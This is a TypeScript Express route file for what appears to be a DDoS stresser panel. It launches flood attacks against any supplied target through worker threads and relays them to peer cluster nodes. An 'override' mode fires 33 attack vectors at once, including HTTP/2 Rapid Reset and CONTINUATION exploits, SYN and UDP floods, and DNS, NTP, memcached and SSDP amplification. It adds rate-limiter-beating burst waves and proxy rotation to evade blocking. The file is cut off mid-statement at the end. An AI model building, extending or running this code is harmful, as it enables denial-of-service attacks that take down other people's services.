/**
 * ATTACKS ROUTE
 *
 * Orchestrates attacks using worker_threads — one worker per CPU core.
 * Each worker runs its own Node.js event loop, dgram UDP sockets, net TCP
 * sockets, and fetch HTTP calls in complete isolation.
 *
 * With 8 CPU cores:
 *   • UDP flood  → 8 × ~200K pkts/s  = ~1.6M pkts/s
 *   • HTTP flood → 8 × ~1200 req/s   = ~9600 req/s
 *   • Geass Ovrd → 8 × triple vector = massive concurrent load
 */
import { Router, type IRouter } from "express";
import { eq, sql, desc } from "drizzle-orm";
import { db, attacksTable } from "@workspace/db";
import { Worker } from "worker_threads";
import os   from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  CreateAttackBody,
  GetAttackParams,
  DeleteAttackParams,
  StopAttackParams,
} from "@workspace/api-zod";
import { proxyCache } from "./proxies.js";
import { CLUSTER_NODES } from "./cluster.js";

// ── Cluster fan-out — fires geass-override to all peer nodes (fire & forget) ─
function fanOutToCluster(target: string, port: number, method: string, duration: number, threads: number): void {
  if (CLUSTER_NODES.length === 0) return;
  for (const nodeUrl of CLUSTER_NODES) {
    void fetch(`${nodeUrl.replace(/\/$/, "")}/api/attacks?peer=1`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ target, port, method, duration, threads }),
      signal:  AbortSignal.timeout(8000),
    }).catch(() => { /* peer may be unreachable — ignore */ });
  }
}

const router: IRouter = Router();

// ── Worker file path (resolved relative to this bundle) ───────────────────
const WORKER_FILE = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
  "attack-worker.mjs",
);

// ── Live in-memory connection counter (slowloris + conn-flood) ─────────────
export const attackLiveConns = new Map<number, number>();

// ── Attack end-time tracking — used to correctly compute remaining time on Extend ──
// Stores absolute epoch-ms when each attack is scheduled to stop.
const attackEndTimes = new Map<number, number>();

// ── In-memory live stats (no DB latency) ───────────────────────────────────
// Accumulated since attack start — never reset until attack ends
const livePackets   = new Map<number, number>(); // total packets in memory
const liveBytes     = new Map<number, number>(); // total bytes in memory
// Snapshot from last rate window (updated every 1s by the rate timer)
const livePps       = new Map<number, number>(); // current pps
const liveBps       = new Map<number, number>(); // current bps
// Previous snapshot for delta calculation
const prevPktsSnap  = new Map<number, number>();
const prevBytesSnap = new Map<number, number>();

// ── DB write batcher — accumulate deltas, flush every 500ms ────────────────
// Prevents ~140 concurrent DB writes/s during Geass Override (21+ vectors × 300ms flush)
const dbBatchPkts  = new Map<number, number>();
const dbBatchBytes = new Map<number, number>();

setInterval(async () => {
  if (dbBatchPkts.size === 0) return;
  const entries       = [...dbBatchPkts.entries()];
  const bytesSnapshot = new Map(dbBatchBytes);   // snapshot BEFORE clear
  dbBatchPkts.clear();
  dbBatchBytes.clear();
  for (const [id, pkts] of entries) {
    const bytes = bytesSnapshot.get(id) ?? 0;
    void addStats(id, pkts, bytes);
  }
}, 500);

// Rate calculator — updates pps/bps from in-memory totals every second
setInterval(() => {
  for (const [id, total] of livePackets.entries()) {
    const prev  = prevPktsSnap.get(id) ?? 0;
    const delta = Math.max(0, total - prev);
    prevPktsSnap.set(id, total);
    livePps.set(id, delta);
  }
  for (const [id, total] of liveBytes.entries()) {
    const prev  = prevBytesSnap.get(id) ?? 0;
    const delta = Math.max(0, total - prev);
    prevBytesSnap.set(id, total);
    liveBps.set(id, delta);
  }
}, 1000);

// ── CPU count (how many parallel workers to spawn) ────────────────────────
const CPU_COUNT = Math.max(1, os.cpus().length);

// ── Webhook ────────────────────────────────────────────────────────────────
async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect) {
  try {
    await fetch(url, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event: "attack_finished", attack }),
      signal: AbortSignal.timeout(5000),
    });
  } catch { /* silent */ }
}

// ── DB stats accumulator ──────────────────────────────────────────────────
async function addStats(id: number, pkts: number, bytes: number) {
  try {
    await db.update(attacksTable).set({
      packetsSent: sql`${attacksTable.packetsSent} + ${pkts}`,
      bytesSent:   sql`${attacksTable.bytesSent}   + ${bytes}`,
    }).where(eq(attacksTable.id, id));
  } catch { /* ignore */ }
}

// ── Worker stats handler: update in-memory live stats + batch for DB ───────
function onWorkerStats(id: number, pkts: number, bytes: number, conns?: number) {
  // In-memory totals — instant, no DB lag
  livePackets.set(id, (livePackets.get(id) ?? 0) + pkts);
  liveBytes.set(id,   (liveBytes.get(id)   ?? 0) + bytes);
  // Queue for batched DB write (flushed every 500ms)
  dbBatchPkts.set(id,  (dbBatchPkts.get(id)  ?? 0) + pkts);
  dbBatchBytes.set(id, (dbBatchBytes.get(id) ?? 0) + bytes);
  // Live connection counter
  if (conns !== undefined) attackLiveConns.set(id, conns);
}


// ─────────────────────────────────────────────────────────────────────────
//  SPAWN POOL — spawns numWorkers workers for a single method
// ─────────────────────────────────────────────────────────────────────────
const HTTP_PROXY_METHODS = new Set([
  // L7 HTTP methods — full proxy rotation (HTTP + SOCKS5)
  "http-flood", "http-bypass", "http-pipeline",
  // L7 application-layer attacks — proxy-aware
  "graphql-dos", "cache-poison", "rudy-v2",
  // TLS/H2 methods — HTTP CONNECT + SOCKS5 tunnel
  "http2-flood", "http2-continuation", "hpack-bomb", "ssl-death", "tls-renego",
  "conn-flood", "ws-flood", "h2-settings-storm", "waf-bypass",
  // New ARES OMNIVECT ∞ vectors — all L7, benefit from IP rotation
  "slow-read", "range-flood", "xml-bomb", "h2-ping-storm",
  "http-smuggling", "doh-flood", "keepalive-exhaust",
  "app-smart-flood", "large-header-bomb", "http2-priority-storm",
]);

function spawnPool(
  method: string, target: string, port: number, threads: number,
  numWorkers: number, signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  const threadsPerWorker = Math.max(1, Math.floor(threads / numWorkers));
  const workers: Worker[] = [];
  const workerConns = new Array<number>(numWorkers).fill(0);
  // Pass top 150 fastest proxies (HTTP + SOCKS5) to workers for rotation
  const proxies = HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0
    ? proxyCache.slice(0, 150).map(p => ({ host: p.host, port: p.port, type: p.type as "http" | "socks5" | undefined }))
    : [];

  return new Promise<void>((resolve) => {
    const finished = new Set<number>();
    let resolved = false;
    const tryResolve = () => { if (!resolved && finished.size >= numWorkers) { resolved = true; resolve(); } };

    for (let i = 0; i < numWorkers; i++) {
      const t = i === numWorkers - 1
        ? threads - threadsPerWorker * (numWorkers - 1)
        : threadsPerWorker;

      // In dev: cap worker heap to avoid container OOM (prod has 32GB, no limit needed)
      const workerOpts: import("worker_threads").WorkerOptions = {
        workerData: { method, target, port, threads: t, proxies },
        ...(process.env.NODE_ENV !== "production" && {
          resourceLimits: { maxOldGenerationSizeMb: 512 },
        }),
      };
      const w = new Worker(WORKER_FILE, workerOpts);
      const idx = i;
      workers.push(w);

      w.on("message", (msg: { pkts?: number; bytes?: number; done?: boolean; conns?: number }) => {
        if (msg.pkts !== undefined && msg.bytes !== undefined) {
          if (msg.conns !== undefined) workerConns[idx] = msg.conns;
          const totalConns = workerConns.reduce((a, b) => a + b, 0);
          onStats(msg.pkts, msg.bytes, totalConns > 0 ? totalConns : undefined);
        }
        if (msg.done) { finished.add(idx); tryResolve(); }
      });
      w.on("error", () => { finished.add(idx); tryResolve(); });
      w.on("exit",  () => { finished.add(idx); tryResolve(); });
    }

    signal.addEventListener("abort", () => {
      workers.forEach(w => { try { w.postMessage("stop"); } catch { /**/ } });
      setTimeout(() => {
        workers.forEach(w => { try { w.terminate(); } catch { /**/ } });
        if (!resolved) { resolved = true; resolve(); }
      }, 2000);
    }, { once: true });
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  RUN ATTACK — spawns CPU_COUNT workers, each with threads/N load
// ─────────────────────────────────────────────────────────────────────────
async function runAttackWorkers(
  method: string, target: string, port: number, threads: number,
  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  // UDP/L3 attacks: SINGLE worker with multiple sockets (multi-worker UDP can deadlock in this env)
  // quic-flood is also UDP-based (port 443/UDP)
  // icmp-flood, dns-amp, ntp-amp, mem-amp, ssdp-amp are real network attacks via dgram UDP
  const UDP_METHODS = new Set([
    "udp-flood", "udp-bypass", "quic-flood",
    "icmp-flood", "dns-amp", "ntp-amp", "mem-amp", "ssdp-amp",
  ]);
  if (UDP_METHODS.has(method)) {
    await spawnPool(method, target, port, threads, 1, signal, onStats);
    return;
  }

  // ── GEASS OVERRIDE: ARES OMNIVECT ∞ — ABSOLUTE TOTAL DEVASTATION ────────
  // ★ 30 SIMULTANEOUS ATTACK VECTORS — 32GB/8vCPU OPTIMIZED ★
  //
  // Layer 7 — Application (12 vectors):
  // Vector  1: Connection Flood        — exhaust nginx worker_connections (pre-HTTP layer)
  // Vector  2: Slowloris               — hold half-open TLS sockets, starve thread pool
  // Vector  3: HTTP/2 Rapid Reset      — CVE-2023-44487: 1000-stream RST burst, dominant CPU
  // Vector  4: H2 CONTINUATION Flood   — CVE-2024-27316: server buffers headers → OOM (nginx ≤1.25.4)
  // Vector  5: HPACK Bomb              — RFC 7541 incremental indexing table eviction storm
  // Vector  6: WAF Bypass              — JA3+AKAMAI Chrome fingerprint, evades CF/Akamai
  // Vector  7: WebSocket Exhaustion    — goroutine/thread per conn + large message frames
  // Vector  8: GraphQL Fragment Bomb   — fragment spread explosion: O(frags × fields) CPU
  // Vector  9: RUDY v2 Slow POST       — multipart/form-data 1GB body, holds server threads
  // Vector 10: Cache Poison            — CDN cache eviction, 100% origin miss rate
  // Vector 11: HTTP Bypass             — Chrome fingerprint + proxy rotation, bypasses CDN/WAF per-IP
  // Vector 12: Keepalive Exhaust       — pipeline 128 reqs/conn, holds server worker threads [NEW]
  //
  // Layer 7 — Advanced HTTP/2 (4 vectors):
  // Vector 13: H2 Settings Storm       — SETTINGS oscillation + WINDOW_UPDATE: 326K pps proved
  // Vector 14: HTTP Pipeline Flood     — HTTP/1.1 pipelining 128 req/write, 300K req/s, no wait
  // Vector 15: H2 PING Storm           — thousands of PING frames/s, server must ACK every one [NEW]
  // Vector 16: HTTP Smuggling          — TE/CL desync, poisons backend request queue [NEW]
  //
  // TLS / Crypto (3 vectors):
  // Vector 17: TLS Renegotiation       — forced public-key handshake 1000×/sec on server CPU
  // Vector 18: SSL Death Record        — 1-byte TLS records, 40K AES-GCM decrypts/sec on server
  // Vector 19: QUIC/HTTP3 Flood        — RFC 9000 DCID exhaustion, crypto state per packet
  //
  // Application Layer — Extended (3 vectors):
  // Vector 20: XML Bomb                — billion-laughs entity expansion to XML/SOAP endpoints [NEW]
  // Vector 21: Slow Read               — pause TCP read, fills server send buffer, thread blocked [NEW]
  // Vector 22: HTTP Range Flood        — Range: 500 × 1-byte ranges, 500× server I/O per req [NEW]
  //
  // Layer 4 — Transport (1 vector):
  // Vector 23: SYN Flood               — pure TCP SYN_RECV table exhaustion before handshake
  //
  // Layer 3 — Network/Amplification (5 vectors):
  // Vector 24: ICMP Flood              — real ICMP echo, raw-socket/hping3/UDP fallback, L3 saturation
  // Vector 25: DNS Water Torture       — floods NS servers, bypasses CDN/WAF, fills NXDOMAIN cache
  // Vector 26: NTP Flood               — real NTP mode 7 monlist + mode 3 client requests
  // Vector 27: Memcached UDP Flood     — real binary Memcached protocol to port 11211
  // Vector 28: SSDP M-SEARCH Flood     — real SSDP M-SEARCH to port 1900 (UPnP stack exhaustion)
  //
  // UDP / Volumetric (2 vectors):
  // Vector 29: UDP Flood               — raw UDP burst engine, 500K pps per worker
  // Vector 30: DNS over HTTPS Flood    — random DNS queries to /dns-query, forces recursive lookup [NEW]
  //
  // ★ ADAPTIVE BURST MODE: after 30s, top 5 vectors auto-spike to +50% threads for 10s waves
  // ★ WORKER SCALING: I/O-bound vectors → 2× CPU_COUNT workers each
  if (method === "geass-override") {
    // ── Worker counts — doubled from previous version for maximum parallelism ──
    const connW    = 6;  // 6×: nginx worker_connections exhaustion (was 3)
    const slowW    = 6;  // 6×: Slowloris = 300K half-open connections (was 3)
    const h2W      = Math.max(24, CPU_COUNT * 3);  // ≥24 — CVE-2023-44487 (was max(16, CPU*2))
    const contW    = Math.max(16, CPU_COUNT * 2);  // ≥16 — CVE-2024-27316 OOM (was max(12, CPU*2))
    const hpackW   = Math.max(12, CPU_COUNT * 2);  // ≥12 — HPACK eviction (was max(8, CPU))
    const wafW     = Math.max(10, CPU_COUNT);      // ≥10 — Chrome fingerprint (was max(8, CPU))
    const wsW      = 4;   // 4× WebSocket exhaustion
    const gqlW     = 4;   // 4× GraphQL exponential
    const rudyW    = 6;   // 6× multipart slow POST
    const cacheW   = 4;   // 4× CDN cache eviction
    const tlsW     = Math.max(6, CPU_COUNT);       // ≥6 — RSA renegotiation CPU
    const quicW    = 2;   // 2× QUIC/H3
    const sslW     = 4;   // 4× SSL Death Record
    const stormW   = Math.max(16, CPU_COUNT * 2);  // ≥16 — H2 Settings Storm (was max(12, CPU*2))
    const pipeW    = Math.max(24, CPU_COUNT * 3);  // ≥24 — HTTP Pipeline (was max(16, CPU*2))
    const bypassW  = Math.max(8,  CPU_COUNT);      // ≥8  — Chrome bypass
    const kaW      = Math.max(6,  CPU_COUNT);      // ≥6  — Keepalive exhaust (was max(4, CPU))
    const pingW    = Math.max(8,  CPU_COUNT * 2);  // ≥8  — H2 PING storm (was max(4, CPU))
    const smugW    = Math.max(6,  CPU_COUNT);      // ≥6  — HTTP smuggling (was max(4, CPU))
    const xmlW     = 4;   // 4× XML bomb (was 3)
    const slowRW   = 5;   // 5× Slow Read (was 4)
    const rangeW   = 5;   // 5× Range Flood (was 4)
    const appW     = Math.max(12, CPU_COUNT * 2);  // ≥12 — App Smart Flood (was max(8, CPU))
    const lhbW     = Math.max(12, CPU_COUNT * 2);  // ≥12 — Large Header Bomb (was max(8, CPU))
    const prioW    = Math.max(10, CPU_COUNT * 2);  // ≥10 — H2 PRIORITY Storm (was max(6, CPU))
    const synW     = 4;   // 4× SYN flood (was 2)
    // L3/UDP — single worker with high socket concurrency
    const icmpW    = 1;  const dnsW = 1;  const ntpW = 1;
    const memW     = 1;  const ssdpW = 1; const udpW = 1; const dohW = 1;

    // ── Thread budget — 32GB/8vCPU ARES OMNIVECT ∞ (33-vector) ──
    const connT    = Math.max(400,  Math.round(threads * 0.08));
    const slowT    = Math.max(400,  Math.round(threads * 0.08));
    const h2T      = Math.max(6000, Math.round(threads * 0.50)); // ★★★ CVE-2023-44487 (was 3000/0.32)
    const contT    = Math.max(4000, Math.round(threads * 0.36)); // ★★★ CVE-2024-27316 OOM (was 2000/0.24)
    const hpackT   = Math.max(2500, Math.round(threads * 0.28)); // ★★ HPACK storm (was 1200/0.18)
    const wafT     = Math.max(2000, Math.round(threads * 0.28)); // ★★ Chrome WAF bypass (was 1200/0.20)
    const wsT      = Math.max(300,  Math.round(threads * 0.08));
    const gqlT     = Math.max(200,  Math.round(threads * 0.06));
    const udpT     = Math.max(256,  Math.round(threads * 0.06));
    const rudyT    = Math.max(240,  Math.round(threads * 0.07));
    const cacheT   = Math.max(200,  Math.round(threads * 0.06));
    const tlsT     = Math.max(200,  Math.round(threads * 0.06));
    const quicT    = Math.max(128,  Math.round(threads * 0.04));
    const sslT     = Math.max(400,  Math.round(threads * 0.08)); // ★ SSL Death Record (was 200)
    const stormT   = Math.max(3000, Math.round(threads * 0.40)); // ★★★ H2 Settings Storm (was 1500/0.26)
    const pipeT    = Math.max(10000,Math.round(threads * 0.60)); // ★★★ HTTP Pipeline (was 5000/0.40)
    const bypassT  = Math.max(1000, Math.round(threads * 0.18)); // ★ Chrome bypass (was 500)
    const kaT      = Math.max(600,  Math.round(threads * 0.12)); // [NEW] Keepalive exhaust
    const pingT    = Math.max(1500, Math.round(threads * 0.22)); // [NEW] H2 PING storm (was 800/0.15)
    const smugT    = Math.max(300,  Math.round(threads * 0.08)); // [NEW] HTTP smuggling
    const xmlT     = Math.max(200,  Math.round(threads * 0.05)); // [NEW] XML bomb
    const slowRT   = Math.max(400,  Math.round(threads * 0.07)); // [NEW] Slow Read
    const rangeT   = Math.max(600,  Math.round(threads * 0.10)); // [NEW] Range flood
    const synT     = Math.max(2048, Math.round(threads * 0.12)); // ★ SYN flood (was 1024)
    // L3/UDP — each gets its own thread pool
    const icmpT    = Math.max(2048, Math.round(threads * 0.12)); // ICMP: 2048 sockets (was 1024)
    const dnsT     = Math.max(2048, Math.round(threads * 0.08)); // DNS Water Torture (was 1024)
    const ntpT     = Math.max(2048, Math.round(threads * 0.07)); // NTP mode 7 monlist (was 1024)
    const memT     = Math.max(1024, Math.round(threads * 0.06)); // Memcached (was 512)
    const ssdpT    = Math.max(1024, Math.round(threads * 0.06)); // SSDP M-SEARCH (was 512)
    const dohT     = Math.max(300,  Math.round(threads * 0.05)); // [NEW] DoH flood
    const appT     = Math.max(2000, Math.round(threads * 0.24)); // ★★ App Smart Flood (was 800/0.16)
    const lhbT     = Math.max(1500, Math.round(threads * 0.18)); // ★★ Large Header Bomb (was 600/0.12)
    const prioT    = Math.max(1200, Math.round(threads * 0.20)); // ★★ H2 PRIORITY Storm (was 600/0.14)

    const geassConnsPerPool = new Map<string, number>();
    const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
      if (c !== undefined) {
        geassConnsPerPool.set(poolKey, c);
        const total = [...geassConnsPerPool.values()].reduce((a, v) => a + v, 0);
        onStats(p, b, total);
      } else {
        onStats(p, b);
      }
    };

    // ── Launch all 33 vectors simultaneously (ARES OMNIVECT ∞) ──────────────────
    const geassPromise = Promise.all([
      // L7 Application (12 vectors)
      spawnPool("conn-flood",          target, port, connT,   connW,   signal, makeGeassOnStats("conn")),
      spawnPool("slowloris",           target, port, slowT,   slowW,   signal, makeGeassOnStats("slow")),
      spawnPool("http2-flood",         target, port, h2T,     h2W,     signal, onStats),
      spawnPool("http2-continuation",  target, port, contT,   contW,   signal, onStats),
      spawnPool("hpack-bomb",          target, port, hpackT,  hpackW,  signal, onStats),
      spawnPool("waf-bypass",          target, port, wafT,    wafW,    signal, onStats),
      spawnPool("ws-flood",            target, port, wsT,     wsW,     signal, makeGeassOnStats("ws")),
      spawnPool("graphql-dos",         target, port, gqlT,    gqlW,    signal, onStats),
      spawnPool("rudy-v2",             target, port, rudyT,   rudyW,   signal, makeGeassOnStats("rudy")),
      spawnPool("cache-poison",        target, port, cacheT,  cacheW,  signal, onStats),
      spawnPool("http-bypass",         target, port, bypassT, bypassW, signal, onStats),
      spawnPool("keepalive-exhaust",   target, port, kaT,     kaW,     signal, makeGeassOnStats("ka")),
      // L7 Advanced H2 (4 vectors)
      spawnPool("h2-settings-storm",   target, port, stormT,  stormW,  signal, onStats),
      spawnPool("http-pipeline",       target, port, pipeT,   pipeW,   signal, onStats),
      spawnPool("h2-ping-storm",       target, port, pingT,   pingW,   signal, onStats),
      spawnPool("http-smuggling",      target, port, smugT,   smugW,   signal, onStats),
      // TLS / Crypto (3 vectors)
      spawnPool("tls-renego",          target, port, tlsT,    tlsW,    signal, makeGeassOnStats("tls")),
      spawnPool("ssl-death",           target, port, sslT,    sslW,    signal, makeGeassOnStats("ssl")),
      spawnPool("quic-flood",          target, port, quicT,   quicW,   signal, onStats),
      // Extended App — Tier 2 (5 vectors)
      spawnPool("xml-bomb",            target, port, xmlT,    xmlW,    signal, onStats),
      spawnPool("slow-read",           target, port, slowRT,  slowRW,  signal, makeGeassOnStats("sr")),
      spawnPool("range-flood",         target, port, rangeT,  rangeW,  signal, onStats),
      spawnPool("app-smart-flood",     target, port, appT,    appW,    signal, onStats),                // [NEW 23]
      spawnPool("large-header-bomb",   target, port, lhbT,    lhbW,    signal, onStats),               // [NEW 24]
      // L7 H2 Priority (1 vector)
      spawnPool("http2-priority-storm",target, port, prioT,   prioW,   signal, onStats),               // [NEW 25]
      // L4 Transport (1 vector)
      spawnPool("syn-flood",           target, port, synT,    synW,    signal, onStats),
      // L3 Network (5 vectors)
      spawnPool("icmp-flood",          target, port, icmpT,   icmpW,   signal, onStats),
      spawnPool("dns-amp",             target, port, dnsT,    dnsW,    signal, onStats),
      spawnPool("ntp-amp",             target, port, ntpT,    ntpW,    signal, onStats),
      spawnPool("mem-amp",             target, port, memT,    memW,    signal, onStats),
      spawnPool("ssdp-amp",            target, port, ssdpT,   ssdpW,   signal, onStats),
      // UDP / Volumetric (2 vectors)
      spawnPool("udp-flood",           target, port, udpT,    udpW,    signal, onStats),
      spawnPool("doh-flood",           target, port, dohT,    dohW,    signal, onStats),
    ]); // Total: 33 ARES OMNIVECT ∞ vectors

    // ── ADAPTIVE BURST MODE ─────────────────────────────────────────────
    // After 30s: fires BURST WAVES alternating between H2/Pipeline-heavy and
    // App-layer-heavy waves — 15s on, 15s off, indefinitely.
    // Wave pattern: odd=H2 heavy (+80%), even=App heavy (+60%), 3rd=Max (+120%)
    // This overwhelms rate limiters tuned for steady-state traffic.
    const burstLoop = async () => {
      await new Promise<void>(r => setTimeout(r, 30_000)); // wait 30s for target to be probed
      let wave = 0;
      while (!signal.aborted) {
        wave++;
        const burstAbort = new AbortController();
        const burstTimer = setTimeout(() => burstAbort.abort(), 15_000);
        const combined: AbortSignal = typeof (AbortSignal as { any?: unknown }).any === "function"
          ? (AbortSignal as unknown as { any(s: AbortSignal[]): AbortSignal }).any([signal, burstAbort.signal])
          : burstAbort.signal;

        if (wave % 3 === 0) {
          // Max spike wave — all top vectors at 2.0× (every 3rd wave)
          void Promise.all([
            spawnPool("http2-flood",        target, port, Math.round(h2T    * 2.0), Math.min(h2W, 8),    combined, onStats),
            spawnPool("http-pipeline",      target, port, Math.round(pipeT  * 2.0), Math.min(pipeW, 8),  combined, onStats),
            spawnPool("h2-settings-storm",  target, port, Math.round(stormT * 2.0), Math.min(stormW, 8), combined, onStats),
            spawnPool("app-smart-flood",    target, port, Math.round(appT   * 2.0), Math.min(appW, 8),   combined, onStats),
            spawnPool("large-header-bomb",  target, port, Math.round(lhbT   * 2.0), Math.min(lhbW, 8),  combined, onStats),
            spawnPool("h2-ping-storm",      target, port, Math.round(pingT  * 2.0), Math.min(pingW, 4),  combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        } else if (wave % 2 === 0) {
          // App-layer heavy wave — DB query exhaustion burst (even waves)
          void Promise.all([
            spawnPool("app-smart-flood",      target, port, Math.round(appT  * 1.8), Math.min(appW, 8),  combined, onStats),
            spawnPool("large-header-bomb",    target, port, Math.round(lhbT  * 1.8), Math.min(lhbW, 8), combined, onStats),
            spawnPool("http2-priority-storm", target, port, Math.round(prioT * 1.8), Math.min(prioW, 6), combined, onStats),
            spawnPool("keepalive-exhaust",    target, port, Math.round(kaT   * 1.8), Math.min(kaW, 4),   combined, onStats),
            spawnPool("http-smuggling",       target, port, Math.round(smugT * 1.8), Math.min(smugW, 4), combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        } else {
          // H2/Protocol heavy wave — bandwidth + H2 state exhaustion (odd waves)
          void Promise.all([
            spawnPool("http2-flood",       target, port, Math.round(h2T    * 1.6), Math.min(h2W, 8),    combined, onStats),
            spawnPool("http-pipeline",     target, port, Math.round(pipeT  * 1.6), Math.min(pipeW, 8),  combined, onStats),
            spawnPool("h2-settings-storm", target, port, Math.round(stormT * 1.6), Math.min(stormW, 8), combined, onStats),
            spawnPool("http2-continuation",target, port, Math.round(contT  * 1.6), Math.min(contW, 8),  combined, onStats),
            spawnPool("h2-ping-storm",     target, port, Math.round(pingT  * 1.6), Math.min(pingW, 4),  combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        }
        // 15s rest between waves
        await new Promise<void>(r => setTimeout(r, 15_000));
      }
    };
    void burstLoop();
    await geassPromise;
    return;
  }

  // All other real-network methods: single pool of CPU_COUNT workers
  await spawnPool(method, target, port, threads, CPU_COUNT, signal, onStats);
}

// ── Routes ────────────────────────────────────────────────────────────────
router.get("/attacks", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  res.json(attacks);
});

router.post("/attacks", async (req, res): Promise<void> => {
  const p = CreateAttackBody.safeParse(req.body);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const { target, port, method, duration, threads, webhookUrl } = p.data;

  const [attack] = await db.insert(attacksTable).values({
    target, port, method, duration, threads,
    status: "running", packetsSent: 0, bytesSent: 0,
    webhookUrl: webhookUrl ?? null,
  }).returning();

  const id   = attack.id;
  const ctrl = new AbortController();
  const endTime = Date.now() + duration * 1000;
  const stopTimer = setTimeout(() => ctrl.abort("duration_expired"), duration * 1000);

  // Store for manual stop + extend support
  attackAborts.set(id, ctrl);
  attackTimers.set(id, stopTimer);
  attackEndTimes.set(id, endTime);

  // Init in-memory counters
  livePackets.set(id, 0);
  liveBytes.set(id, 0);
  livePps.set(id, 0);
  liveBps.set(id, 0);
  prevPktsSnap.set(id, 0);
  prevBytesSnap.set(id, 0);

  // ── Geass Override cluster fan-out (primary node only, not peer) ────────────
  if (method === "geass-override" && !req.query.peer) {
    fanOutToCluster(target, port, method, duration, threads);
  }

  void runAttackWorkers(method, target, port, threads, ctrl.signal,
    (pkts, bytes, conns) => onWorkerStats(id, pkts, bytes, conns)
  ).finally(async () => {
    // Final flush of any pending batch stats
    const pending = dbBatchPkts.get(id) ?? 0;
    const pendingBytes = dbBatchBytes.get(id) ?? 0;
    dbBatchPkts.delete(id);
    dbBatchBytes.delete(id);
    if (pending > 0 || pendingBytes > 0) void addStats(id, pending, pendingBytes);

    attackLiveConns.delete(id);
    livePackets.delete(id);
    liveBytes.delete(id);
    livePps.delete(id);
    liveBps.delete(id);
    prevPktsSnap.delete(id);
    prevBytesSnap.delete(id);
    const t = attackTimers.get(id);
    if (t) clearTimeout(t);
    attackTimers.delete(id);
    attackAborts.delete(id);
    attackEndTimes.delete(id);
    try {
      const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, id));
      if (cur?.status === "running") {
        const [fin] = await db.update(attacksTable)
          .set({ status: "finished", stoppedAt: new Date() })
          .where(eq(attacksTable.id, id)).returning();
        if (fin?.webhookUrl) await fireWebhook(fin.webhookUrl, fin);
      }
    } catch { /* ignore */ }
  });

  res.status(201).json(attack);
});

// Map for abort controllers + stop timers (for Extend support)
const attackAborts  = new Map<number, AbortController>();
const attackTimers  = new Map<number, ReturnType<typeof setTimeout>>();

router.get("/attacks/stats", async (_req, res): Promise<void> => {
  // Run all 3 queries in parallel — no full table scan in JS
  const [aggRows, methodRows, recentAttacks] = await Promise.all([
    // 1. Aggregate totals — O(1) via SQL COUNT/SUM
    db.select({
      totalAttacks:     sql<number>`COUNT(*)::int`,
      runningAttacks:   sql<number>`COUNT(*) FILTER (WHERE status = 'running')::int`,
      totalPacketsSent: sql<number>`COALESCE(SUM(packets_sent), 0)::bigint`,
      totalBytesSent:   sql<number>`COALESCE(SUM(bytes_sent), 0)::bigint`,
    }).from(attacksTable),
    // 2. Per-method counts — O(distinct methods) index scan
    db.select({
      method: attacksTable.method,
      count:  sql<number>`COUNT(*)::int`,
    }).from(attacksTable).groupBy(attacksTable.method),
    // 3. Recent 10 only — O(10) with LIMIT
    db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt)).limit(10),
  ]);
  const agg = aggRows[0];
  res.json({
    totalAttacks:     agg.totalAttacks,
    runningAttacks:   agg.runningAttacks,
    totalPacketsSent: Number(agg.totalPacketsSent),
    totalBytesSent:   Number(agg.totalBytesSent),
    attacksByMethod:  methodRows,
    recentAttacks,
    cpuCount:         CPU_COUNT,
  });
});

// Live in-memory stats — real-time, no DB latency
// Returns conns, pps, bps, totalPackets, totalBytes, running
router.get("/attacks/:id/live", (req, res): void => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const running = attackAborts.has(id);
  res.json({
    conns:        attackLiveConns.get(id) ?? 0,
    running,
    pps:          livePps.get(id)     ?? 0,
    bps:          liveBps.get(id)     ?? 0,
    totalPackets: livePackets.get(id) ?? 0,
    totalBytes:   liveBytes.get(id)   ?? 0,
  });
});

router.get("/attacks/:id", async (req, res): Promise<void> => {
  const p = GetAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.select().from(attacksTable).where(eq(attacksTable.id, p.data.id));
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json(a);
});

router.delete("/attacks/:id", async (req, res): Promise<void> => {
  const p = DeleteAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.delete(attacksTable).where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.sendStatus(204);
});

// ── Extend running attack by +60s ────────────────────────────────────────
router.patch("/attacks/:id/extend", async (req, res): Promise<void> => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const ctrl = attackAborts.get(id);
  if (!ctrl) { res.status(404).json({ error: "Attack not running" }); return; }
  const addSec = typeof req.body?.seconds === "number" ? Math.min(req.body.seconds, 3600) : 60;

  // Clear old stop timer, arm new one using correct remaining time
  // Bug-fix: previously reset timer to addSec from NOW, losing remaining original time.
  // Now we compute: newEndTime = max(now, currentEndTime) + addSec
  const old = attackTimers.get(id);
  if (old) clearTimeout(old);
  const currentEnd = attackEndTimes.get(id) ?? Date.now();
  const newEnd     = Math.max(Date.now(), currentEnd) + addSec * 1000;
  const msFromNow  = newEnd - Date.now();
  attackEndTimes.set(id, newEnd);
  const newTimer = setTimeout(() => ctrl.abort("duration_expired"), msFromNow);
  attackTimers.set(id, newTimer);

  const [a] = await db.update(attacksTable)
    .set({ duration: sql`${attacksTable.duration} + ${addSec}` })
